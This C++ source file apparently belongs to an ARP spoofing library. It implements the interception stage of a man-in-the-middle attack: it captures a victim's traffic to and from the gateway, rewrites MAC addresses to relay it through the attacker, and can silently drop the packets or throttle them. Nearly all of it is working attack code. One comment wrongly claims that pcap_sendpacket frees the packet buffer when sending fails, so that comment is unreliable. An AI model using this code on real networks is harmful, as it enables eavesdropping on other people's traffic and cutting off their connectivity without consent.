#include "arp_spoofer_lib/headers/net_structure.h"
#include "arp_spoofer_lib/headers/PacketHandler.h"

PacketHandler::PacketHandler(pcap_t *adapter, u_char self_mac[6],
                             u_char target_mac[6], u_char gateway_mac[6],
                             u_char target_ip[4])
        : m_adapter(adapter), m_to_stop(false),
          m_to_stop_forwarding(false), m_will_drop_pkt(false),
          m_rate_limit_kBps(INT32_MAX) {
    std::copy(target_ip, target_ip + 4, m_target_ip);
    std::copy(self_mac, self_mac + 6, m_self_mac);
    std::copy(gateway_mac, gateway_mac + 6, m_gateway_mac);
    std::copy(target_mac, target_mac + 6, m_target_mac);
}

void PacketHandler::packet_handler_f(u_char *param,
                                     const struct pcap_pkthdr *header,
                                     const u_char *pkt_data) {
    // Parse user parameters
    auto *args = (pkt_handler_args *) param;
    bool *will_drop_pkt = args->will_drop_pkt;
    bool *to_stop = args->to_stop;
    pcap_t *adapter = args->adapter;
    u_char *self_mac = args->self_mac;
    u_char *gateway_mac = args->gateway_mac;
    u_char *target_mac = args->target_mac;
    u_char *target_ip = args->target_ip;
    pkt_queue &forwarded_pkt_queue = *(args->forwarded_pkt_queue);
    long *rate_limit_kBps = args->rate_limit_kBps;


    // Parse packet data
    auto *eh = (ethernet_header *) pkt_data;
    auto *ih = (ip_header *) (pkt_data + sizeof(ethernet_header));

    if (*to_stop) {
        pcap_breakloop(adapter);
    }

    // If packet is sent from gateway to target
    if (equal(ih->destination_addr, ih->destination_addr + 4,
              target_ip)) {
        printf("To   Target:  %3d.%3d.%3d.%3d -> %3d.%3d.%3d.%3d | %-4d",
               EXPAND_IP(ih->source_addr),
               EXPAND_IP(target_ip),
               header->len);

        if (equal(eh->dst_mac, eh->dst_mac + 6, self_mac))
            printf(" | From Gateway");
        else if (equal(eh->dst_mac, eh->dst_mac + 6, target_mac))
            printf(" | Forwarding  ");


        if (!(*will_drop_pkt)) {
            if (ByteCounter::get_counter() < *rate_limit_kBps) {
                std::copy(self_mac, self_mac + 6, eh->src_mac);
                std::copy(target_mac, target_mac + 6, eh->dst_mac);

                _to_farward_pkt pkt;
                pkt.len = header->len;
                pkt.packet_ptr = new u_char[header->len];
                std::copy(pkt_data, pkt_data + header->len, pkt.packet_ptr);
                forwarded_pkt_queue.push_back(pkt);

                ByteCounter::counter_add(header->len);

                printf(" | Forwarding");
            } else {
                printf(" | Exceeded %ld kBps", ByteCounter::get_counter());
            }
        } else
            printf(" | Dropped");
        printf("\n");
    }

    // If packet is sent from target to gateway
    if (equal(ih->source_addr, ih->source_addr + 4,
              target_ip)) {
        printf("From Target:  %3d.%3d.%3d.%3d -> %3d.%3d.%3d.%3d | %-4d",
               EXPAND_IP(target_ip),
               EXPAND_IP(ih->destination_addr),
               header->len);

        if (equal(eh->dst_mac, eh->dst_mac + 6, self_mac))
            printf(" | From Target ");
        else if (equal(eh->dst_mac, eh->dst_mac + 6, gateway_mac))
            printf(" | Forwarding  ");

        if (!(*will_drop_pkt)) {
            if (ByteCounter::get_counter() < *rate_limit_kBps) {
                std::copy(self_mac, self_mac + 6, eh->src_mac);
                std::copy(gateway_mac, gateway_mac + 6, eh->dst_mac);

                _to_farward_pkt pkt;
                pkt.len = header->len;
                pkt.packet_ptr = new u_char[header->len];
                std::copy(pkt_data, pkt_data + header->len, pkt.packet_ptr);
                forwarded_pkt_queue.push_back(pkt);

                ByteCounter::counter_add(header->len);

                printf(" | Forwarding");
            } else {
                printf(" | Exceeded %ld kBps", ByteCounter::get_counter());
            }
        } else
            printf(" | Dropped");
        printf("\n");
    }
}

void PacketHandler::start() {
    stop();

    ByteCounter::start_counter();
    start_forwarding_thread();

    pkt_handler_args args;
    args.will_drop_pkt = &m_will_drop_pkt;
    args.to_stop = &m_to_stop;
    args.adapter = m_adapter;
    args.self_mac = m_self_mac;
    args.target_mac = m_target_mac;
    args.gateway_mac = m_gateway_mac;
    args.target_ip = m_target_ip;
    args.forwarded_pkt_queue = &m_forwarded_pkt_queue;
    args.rate_limit_kBps = &m_rate_limit_kBps;

    auto pcap_loop_lambda_f = [this, args]() {
        pcap_loop(m_adapter, 0,
                  &PacketHandler::packet_handler_f, (u_char *) &args);
    };

    m_pcap_loop_t = thread(pcap_loop_lambda_f);
}

void PacketHandler::stop() {
    if (m_pcap_loop_t.joinable()) {
        m_to_stop = true;
        m_pcap_loop_t.join();
    }
    m_to_stop = false;

    stop_forwarding_thread();
    ByteCounter::stop_counter();
}

void PacketHandler::set_drop_packet(bool v) {
    m_will_drop_pkt = v;
}

void PacketHandler::start_forwarding_thread() {
    stop_forwarding_thread();

    auto packet_forwarding_lambda_f = [this, adapter = m_adapter]
            (bool &to_stop_forwarding, pkt_queue &pkt_q) {
        while (!to_stop_forwarding) {
            auto pkt = pkt_q.pop_front();
            auto len = pkt.len;

            if (pcap_sendpacket(adapter,
                                (const u_char *) pkt.packet_ptr,
                                pkt.len
            ) < 0) {
                printf("[packet_handler_f] pkt.len: %-4d | ", len);
                pcap_perror(adapter, "Error occurred when forwarding pkt");
            } else {
                // delete is written here in 'else' branch because
                //  'pcap_sendpacket' must have freed the 'pkt_ptr' once when
                //  it failed to send the packet!
                // if we still free 'pkt_ptr' when 'pcap_sendpacket' fails,
                //  double free will be caused.
                delete[] pkt.packet_ptr;
            }
        }
    };

    m_pcap_forwarding_t = thread(packet_forwarding_lambda_f,
                                 std::ref(m_to_stop_forwarding),
                                 std::ref(m_forwarded_pkt_queue));
}

void PacketHandler::stop_forwarding_thread() {
    if (m_pcap_forwarding_t.joinable()) {
        m_to_stop_forwarding = true;
        m_pcap_forwarding_t.join();
    }
    m_to_stop_forwarding = false;
}

void PacketHandler::set_rate_limit_kBps(int v) {
    m_rate_limit_kBps = long(v) * 1024;
}

